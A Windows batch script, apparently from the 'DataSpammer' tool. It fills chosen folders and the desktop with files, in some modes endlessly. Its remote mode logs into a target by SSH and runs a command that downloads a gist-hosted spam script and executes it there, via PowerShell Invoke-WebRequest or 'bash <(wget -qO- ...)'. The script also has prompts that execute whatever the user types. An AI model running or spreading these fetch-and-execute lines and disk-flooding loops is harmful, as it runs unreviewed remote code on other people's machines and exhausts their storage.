    set /P ssh-ip=Enter the IP:
    if %ssh-ip% == help (
        start "" "https://support.ucsd.edu/services?id=kb_article_view&sysparm_article=KB0032480"
    ) else (
        goto ssh.spam.setup
    )
:ssh.spam.setup
    :: Check if IP is valid
    setlocal enabledelayedexpansion
    echo !ssh-ip! | findstr /R "^([0-9]{1,3}\.){3}[0-9]{1,3}$"
    if %errorlevel% equ 0 (
        goto ssh.spam.setup.2
    ) else (
        echo The IP you entered doesnt seem Valid. Please try again.
        pause
        goto ssh.spam.info
    )

:ssh.spam.setup.2
    :: Enter other things needed for Remotespam
    set /P ssh-name=Enter an Account Name:
    rem set /P ssh-pswd=Enter the Password of the Account:
    set /P ssh-filecount=How many files do you want to create:
    call :sys.verify.execution
    cls

:start.ssh
    :: 100% UD ASSET COUNTER (Does nothing)
    set "assetcount=1"
    :assetcounttop
    color 02
    @ping -n 1 localhost> nul
    echo Loading Assets [%assetcount%/32]
    set /a "assetcount+=1"
    cls
    If %assetcount% == 33 (goto ssh.start.spam) else (goto assetcounttop)

:ssh.start.spam
    echo Is the SSH Target based on Linux or Windows?
    echo.
    echo [1] Windows
    echo.
    echo [2] Linux
    echo.
    echo.
    set /P linux-win-ssh=Choose an Option from Above:
    if %linux-win-ssh% == 1 goto ssh.start.spam
    if %linux-win-ssh% == 2 goto spam.ssh.target.lx

:spam.ssh.target.win
    set ssh_command="Invoke-WebRequest -Uri 'https://gist.githubusercontent.com/PIRANY1/81dab116782df1f051f465f4fcadfe6c/raw/5d7fdba0a0d30b25dd0df544a1469146349bc37e/spam.bat' -OutFile 'spam.bat'; Start-Process 'spam.bat' -ArgumentList %ssh-filecount%"
    ssh %ssh-name%@%ssh-ip% "powershell -Command %ssh_command%"
    echo Successfully executed SSH Connection.
    goto ssh.done

:spam.ssh.target.lx
    set ssh_command="bash <(wget -qO- https://gist.githubusercontent.com/PIRANY1/81dab116782df1f051f465f4fcadfe6c/raw/5d7fdba0a0d30b25dd0df544a1469146349bc37e/spam.sh) %filecount%"
    ssh %ssh-name%@%ssh-ip% "%ssh_command%"
    echo Successfully executed SSH Connection.
    goto ssh.done

:ssh.done
    :: Remote Spam Done TLI
    echo.
    %$Echo% "   ____        _        ____                                            _           ____ ___ ____      _    _   ___   __
    %$Echo% "  |  _ \  __ _| |_ __ _/ ___| _ __   __ _ _ __ ___  _ __ ___   ___ _ __| |__  _   _|  _ \_ _|  _ \    / \  | \ | \ \ / /
    %$Echo% "  | | | |/ _` | __/ _` \___ \| '_ \ / _` | '_ ` _ \| '_ ` _ \ / _ \ '__| '_ \| | | | |_) | || |_) |  / _ \ |  \| |\ V / 
    %$Echo% "  | |_| | (_| | || (_| |___) | |_) | (_| | | | | | | | | | | |  __/ |  | |_) | |_| |  __/| ||  _ <  / ___ \| |\  | | |  
    %$Echo% "  |____/ \__,_|\__\__,_|____/| .__/ \__,_|_| |_| |_|_| |_| |_|\___|_|  |_.__/ \__, |_|  |___|_| \_\/_/   \_\_| \_| |_|  
    %$Echo% "                             |_|                                              |___/                                                                                                                                  
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo The Script Created %ssh-filecount% Files on the PC of %ssh-name%
    echo.
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo Do you want to Close the Script or Go to the Menu?
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [1] Close
    echo.
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [2] Menu
    echo.
    @ping -n 1 localhost> nul
    set /p menu9=Choose an Option from Above:
    If %menu9% == 1 goto cancel
    If %menu9% == 2 goto menu
    goto ssh.done

:desktop.icon.spam
    :: Desktop Spam Start TLI
    @ping -n 1 localhost> nul
    echo This Method will Spam your Desktop with Files
    @ping -n 1 localhost> nul
    echo You can customise four things here. 
    @ping -n 1 localhost> nul
    echo 1:Filename
    @ping -n 1 localhost> nul
    echo 2:Format of the File (for example .txt or .bat)
    @ping -n 1 localhost> nul
    echo 3:The Text in the File
    @ping -n 1 localhost> nul
    echo 4:Count of Files
    @ping -n 1 localhost> nul
    echo.
    echo [1] Start 
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [2] Go Back
    @ping -n 1 localhost> nul
    echo.
    echo.
    set /p menu1877=Choose an Option from Above:
    If %menu1877% == 2 goto start
    If %menu1877% == 1 goto desktop.icon.spam.1
    goto desktop.icon.spam

:desktop.icon.spam.1
    :: Name TLI
    echo How Should the Files be named?
    @ping -n 1 localhost> nul
    echo The Filename cant include one of the following Character(s):\ / : * ? " < > |"
    @ping -n 1 localhost> nul
    set /p "deskiconspamname=Choose a Filename:"
    goto desktop.icon.spam.2

:desktop.icon.spam.2 
    :: Format TLI
    echo Now Choose the Format of the File
    @ping -n 1 localhost> nul
    echo If you are not sure type txt
    @ping -n 1 localhost> nul
    echo Please not include the dot
    @ping -n 1 localhost> nul
    set /p "deskiconspamformat=Choose the Format:"
    goto desktop.icon.spam.3

:desktop.icon.spam.3
    :: Content TLI
    echo Now Choose the Content the File should include
    @ping -n 1 localhost> nul
    set /p "deskiconspamcontent=Type something in:"
    goto desktop.icon.spam.4

:desktop.icon.spam.4
    :: Filecount TLI
    echo Now Choose how many files should be created 
    @ping -n 1 localhost> nul
    echo Leave empty if you want infinite.
    @ping -n 1 localhost> nul
    set /p "deskiconspamamount=Type a Number:"
    call :sys.verify.execution
    cls

:desktop.icon.spam.confirm.data
    :: 100% UD ASSET COUNTER (does nothing but look cool)
    set "assetcount=1"
    :assetcounttop
    color 02
    @ping -n 1 localhost> nul
    echo Loading Assets(%assetcount%/32)
    set /a "assetcount+=1"
    If %assetcount% == 33 (goto desktop.icon.spam.confirmed.start) else (goto assetcounttop)

:desktop.icon.spam.confirmed.start
    :: Desktop Spam Countdown
    cls
    color 02
    echo The Desktopiconspammer is about to start....
    @ping -n 2 localhost> nul
    echo 3 Seconds Left
    echo If you want to stop this, Simply close the CMD-Window
    @ping -n 2 localhost> nul
    echo 2 Seconds Left
    @ping -n 2 localhost> nul
    echo 1 Seconds Left
    @ping -n 1 localhost> nul
    echo Starting.....
    cd /d %userprofile%\Desktop
    if not defined deskiconspamamount (
        goto infinite.desktop.spam
    ) else (
        goto limitedspam.desktop.spam
    )
    exit


:infinite.desktop.spam
    :: Infinite Spam Function
    :infinite.desktop.spam.1
    echo %deskiconspamcontent% > %deskiconspamname%.%deskiconspamformat%
    goto infinite.desktop.spam.1
    exit

:limited.desktop.spam
    :: Limited Spam Function
    color 02
    set "deskspamlimitedvar=1"
    :limited.desktop.spam.1
    If %deskspamlimitedvar% == %deskiconspamamount% (goto done2) else (goto limited.desktop.spam.2)
    :limited.desktop.spam.2
    echo Created %deskspamlimitedvar% File(s)
    echo %deskiconspamcontent% > %deskiconspamname%%deskspamlimitedvar%.%deskiconspamformat%
    set /a "deskspamlimitedvar+=1"
    goto limited.desktop.spam.1

:normal.text.spam
    :: dont know if that function is even used but it works
    if stdrc1 equ notused (goto sys.no.var.set) else (cd /d %stdrc1% && goto sys.check.custom.name)

:sys.no.var.set
    :: normal spam tli
    cls
    echo Please enter the Directory of the Folder/Server you want to Spam.
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo You can find the Directory by Clicking on the Path in you Explorer (on top) and copy it in here. 
    @ping -n 1 localhost> nul
    echo. 
    @ping -n 1 localhost> nul
    echo It should look something like this: C:\User\Dokuments\SpamFolder
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo You can use your User Directory if you are using a Server. This works in most Cases but it sometimes doesnt work. Why dont you try?
    @ping -n 1 localhost> nul
    echo. 
    @ping -n 1 localhost> nul
    echo [1] Use User Directory
    @ping -n 1 localhost> nul
    echo. 
    @ping -n 1 localhost> nul
    echo [2] Enter a Directory
    @ping -n 1 localhost> nul
    set /p menu5=Choose an Option from Above:
    If %menu5% == 1 goto spam.use.user
    If %menu5% == 2 goto spam.custom.directory

:spam.use.user
    :: what is this doin here?
    cd /d %userprofile%

:spam.custom.directory
    :: enter directory tli
    echo.
    echo.
    set /p directory1=Type Your Directory Here:

    cd /d %directory1%

    if %ERRORLEVEL% neq 0 (
        echo There was an Error. Please check if the Directory is correct or retry later. 
    ) else (
        echo The Directory was Correct!
        goto sys.check.custom.name
    )

:sys.check.custom.name
    :: check if filename setting is used
    if %stdfile% equ notused (goto sys.check.custom.name.2) else (goto spam.time.window.ask)

:sys.check.custom.name.2
    :: filename tli
    cls
    echo Now You have to choose a filename. It can be anything as long as the 
    echo Filename doesnt have the following Character(s):\ / : * ? " < > |"
    set /p stdfile=Type in the Filename you want to use.
    setlocal enabledelayedexpansion
    goto spam.time.window.ask

:spam.time.window.ask
    :: check if the script should run for eternity
    cls
    echo.
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo Do you want to set how many files should be created?
    @ping -n 1 localhost> nul
    echo If you choose No the script will run for eternity.
    @ping -n 1 localhost> nul
    set /p menu6=Yes[y]  No [n]:
    If %menu6% == y goto spam.time.window.set 
    If %menu6% == n set "filecount=1%large%%large%%large%%large%%large%%large%%large%%large%%large%%large%%large%" && goto spam.ready.to.start
    goto spam.time.window.ask

:spam.time.window.set 
    :: filecount tli
    cls
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo How many Files should be created?
    set /p filecount=Type a Number:
    goto spam.ready.to.start

:spam.ready.to.start
    :: confirmation dialoge
    cls
    echo. 
    echo.
    echo Please confirm.
    pause
    echo Loading...
    @ping -n 2 localhost> nul
    echo 5 Seconds left
    @ping -n 2 localhost> nul
    echo 4 Seconds left
    @ping -n 2 localhost> nul
    echo 3 Seconds left
    @ping -n 2 localhost> nul
    echo 2 Seconds left
    @ping -n 2 localhost> nul
    echo 1 Second left
    @ping -n 2 localhost> nul
    echo Starting......
    echo If you want to stop this script simply close the Command Windows or press ALT+F4 / CTRL+C
:spam.normal.top
    :: create files
    set /a x+=1
    echo. > %stdfile%%x%.txt
    echo Created %x% File(s).
    if %x% equ %filecount% (goto done) else (goto spam.normal.top)


:done
    :: done tli
    cls
    echo.
    %$Echo% "   ____        _        ____                                            _           ____ ___ ____      _    _   ___   __
    %$Echo% "  |  _ \  __ _| |_ __ _/ ___| _ __   __ _ _ __ ___  _ __ ___   ___ _ __| |__  _   _|  _ \_ _|  _ \    / \  | \ | \ \ / /
    %$Echo% "  | | | |/ _` | __/ _` \___ \| '_ \ / _` | '_ ` _ \| '_ ` _ \ / _ \ '__| '_ \| | | | |_) | || |_) |  / _ \ |  \| |\ V / 
    %$Echo% "  | |_| | (_| | || (_| |___) | |_) | (_| | | | | | | | | | | |  __/ |  | |_) | |_| |  __/| ||  _ <  / ___ \| |\  | | |  
    %$Echo% "  |____/ \__,_|\__\__,_|____/| .__/ \__,_|_| |_| |_|_| |_| |_|\___|_|  |_.__/ \__, |_|  |___|_| \_\/_/   \_\_| \_| |_|  
    %$Echo% "                             |_|                                              |___/                                                                                                                                     

    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo The Script Created %filecount% Files.
    echo.
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo Do you want to Close the Script or Go to the Menu?
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [1] Close
    echo.
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [2] Menu
    echo.
    @ping -n 1 localhost> nul
    set /p menu9=Choose an Option from Above:
    If %menu9% == 1 goto cancel
    If %menu9% == 2 goto menu
    goto done

:done2
    :: done tli
    echo.
    %$Echo% "   ____        _        ____                                            _           ____ ___ ____      _    _   ___   __
    %$Echo% "  |  _ \  __ _| |_ __ _/ ___| _ __   __ _ _ __ ___  _ __ ___   ___ _ __| |__  _   _|  _ \_ _|  _ \    / \  | \ | \ \ / /
    %$Echo% "  | | | |/ _` | __/ _` \___ \| '_ \ / _` | '_ ` _ \| '_ ` _ \ / _ \ '__| '_ \| | | | |_) | || |_) |  / _ \ |  \| |\ V / 
    %$Echo% "  | |_| | (_| | || (_| |___) | |_) | (_| | | | | | | | | | | |  __/ |  | |_) | |_| |  __/| ||  _ <  / ___ \| |\  | | |  
    %$Echo% "  |____/ \__,_|\__\__,_|____/| .__/ \__,_|_| |_| |_|_| |_| |_|\___|_|  |_.__/ \__, |_|  |___|_| \_\/_/   \_\_| \_| |_|  
    %$Echo% "                             |_|                                              |___/                                     
                                                                                              

    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo The Script Created %deskspamlimitedvar% Files.
    echo.
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo Do you want to Close the Script or Go to the Menu?
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [1] Close
    echo.
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [2] Menu
    echo.
    @ping -n 1 localhost> nul
    set /p menu9=Choose an Option from Above:
    If %menu9% == 1 goto cancel
    If %menu9% == 2 goto menu
    goto done2

    :: Display Help Dialog
:help.startup
    echo.
    echo.
    echo Dataspammer: 
    echo    Script with that you can spam various Windows Directorys and more.
    echo    Made for educational Purposes only.
    echo.
    echo Usage dataspammer [Argument]
    echo       dataspammer.bat [Argument]
    echo.
    echo Parameters: 
    echo    help Show this Help Dialog
    echo.
    echo    update Check for Updates and exit afterwards
    echo.
    echo    faststart Start the Script without checking for Anything 
    echo.
    echo    remove Remove the Script and its components from your System
    echo.
    echo    start Directly start a Spam Method
    echo.
    echo    api Call the Scripts API and get a Plain-Text response (currently in Alpha)
    echo.
    echo    cli Use the Scripts CLI Interface (currently in Alpha)
    echo.
    echo    noelev Start the Script without Administrator
    echo.
    echo.

    exit /b 1464

    :: Whitout the UD stuff
:fast.git.update
    set "current-script-version=v3.3"
    set "owner=PIRANY1"
    set "repo=DataSpammer"
    set "api_url=https://api.github.com/repos/%owner%/%repo%/releases/latest"
    echo Fetching Data...
    cd %temp%
    curl -s %api_url% > apianswer.txt
    for /f "tokens=2 delims=:, " %%a in ('findstr /R /C:"\"tag_name\"" apianswer.txt') do (
        set "latest_version=%%a"
    )
    set "latest_version=%latest_version:"=%"

    if "%latest_version%" equ "%current-script-version%" (
        echo The Script is up-to-date [Version:%latest_version%]
    ) else (
        echo Your Script is outdated [Newest Version: %latest_version% Script Version:%current-script-version%]
    )
    del apianswer.txt
    cd /d %~dp0
    exit /b 0

:custom.go
   if "%1"=="go" goto custom.go
   set "custom.goto.location=%2"
   goto %custom.goto.location%


:sys.delete.script
    :: Delete Script TLI
    echo. 
    @ping -n 1 localhost> nul
    echo You are about to delete the whole script.
    @ping -n 1 localhost> nul 
    echo Are you sure about this decision?
    @ping -n 1 localhost> nul
    echo If the script is bugged or you want to download the new Version please Visit the GitHub Repo
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [1] Yes, Delete the Whole Script
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [2] Open the Github-Repo
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [3] No Go Back
    @ping -n 1 localhost> nul
    echo.
    echo.
    set /p delscrconf=Choose an Option from Above

    If %delscrconf% == 1 goto sys.delete.script.check.elevation
    If %delscrconf% == 2 explorer "https://github.com/PIRANY1/DataSpammer" && goto sys.delete.script
    If %delscrconf% == 3 exit /b 100
    goto sys.delete.script

:sys.delete.script.check.elevation
    :: Check if Script is elevated
    setlocal enableextensions ENABLEDELAYEDEXPANSION 
    net session >nul 2>&1
    if %errorLevel% == 0 (goto sys.delete.script.confirmed) else (goto sys.script.administrator)
   
:sys.delete.script.confirmed
    :: Delete Script 
    if exist "%~dp0\LICENSE" del "%~dp0\LICENSE"
    echo 1/7 Files Deleted
    @ping -n 1 localhost> nul
    if exist "%~dp0\README.md" del "%~dp0\README.md"
    echo 2/7 Files Deleted
    @ping -n 1 localhost> nul
    if exist "%~dp0\dataspammer.bat" del "%~dp0\dataspammer.bat"
    echo 3/7 Files Deleted
    @ping -n 1 localhost> nul
    if exist "%~dp0\install.bat" del "%~dp0\install.bat"
    echo 4/7 Files Deleted
    cd /d C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
    if exist "autostart.bat" del "autostart.bat"
    echo 5/7 Files Deleted
    @ping -n 1 localhost> nul
    cd /d %userprofile%\Desktop
    if exist "Dataspammer.bat" del "Dataspammer.bat"
    echo 6/7 Files Deleted
    @ping -n 1 localhost> nul
    set "startMenuPrograms=%ProgramData%\Microsoft\Windows\Start Menu\Programs"
    cd /d %startMenuPrograms%
    if exist "Dataspammer.bat" del "Dataspammer.bat"
    echo 7/7 Files Deleted
    echo Uninstall Successfull
    
:sys.script.administrator
    :: Script isnt elevated TLI
    echo Please start the Script as Administrator in order to install.
    echo To do this right click the Dataspammer File and click "Run As Administrator"
    echo The Explorer Windows with the Script will open in 5 Seconds
    timeout 5
    explorer %~dp0
    exit 0

:restart.script
    cd %~dp0
    dataspammer.bat
    exit restarted.script

:sys.cli
    @echo off
    for /f %%A in ('"prompt $H &echo on &for %%B in (1) do rem"') do set BS=%%A
    echo Type 'help' to get an overview of commands
    :sys.cli.input
    echo.
    echo  [97m???[0m([92m%username%[0m@[95m%computername%[0m)-[[91m%cd%[0m] - [[94m%time% %date%[0m]
    set /p cmd=".%BS% [97m???>[0m "
    echo.
    %cmd%
    goto sys.cli.input

:sys.api
    echo This Feature is in Active Developement!
    exit /b api.dev.active

:log
    :: call scheme is:
    :: if %logging% == 1 ( set "log.msg=Starting DataSpammer" && call :log %log.msg% )

    set "log.content=%1"
    set "logfile=DataSpammer.log"
    
    :: Check Folder Structure
    set "folder=%userprofile%\Documents\DataSpammerLog"
    if not exist "%folder%" (
        mkdir "%folder%"
    )
    
    echo %date% %time% %log.content% >> "%folder%\%logfile%"
    :: exit
    exit /b 0
    
    :: NEED TO FIX THIS PART / Content not gets written
        :: convert time and date to readable format
        ::setlocal enabledelayedexpansion
        ::for /f "tokens=1-3 delims=:," %%a in ("%currentTime%") do (
        ::    set "hours=%%a"
        ::    set "minutes=%%b"
        ::    set "seconds=%%c"
        ::)
        ::set "seconds=!seconds:~0,2!" 
        ::set "formattedTime=!hours!:!minutes!:!seconds!"
        
        :: Write Log
        ::echo !currentDate! !formattedTime! %log.content% >> "%folder%\%logfile%"


:sys.verify.execution
    set "verify=%random%"
    powershell -Command "& {Add-Type -AssemblyName Microsoft.VisualBasic; [Microsoft.VisualBasic.Interaction]::InputBox('Please enter Code %verify% to confirm that you want to execute this Option', 'DataSpammer Verify')}" > %TEMP%\out.tmp
    set /p OUT=<%TEMP%\out.tmp
    if %verify%==%OUT% (goto success) else (goto failed)

:success
    set msgBoxArgs="& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Sucess', 'DataSpammer Verify');}"
    powershell -Command %msgBoxArgs%
    exit /b

:failed
    set msgBoxArgs="& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('You have entered the wrong Code. Please try again', 'DataSpammer Verify');}"
    powershell -Command %msgBoxArgs%
    goto sys.verify.execution

:cancel 
    :: yes
    exit


:dtd
    :: ud dev stuff
    set /p dtd1=.:.
    %dtd1%
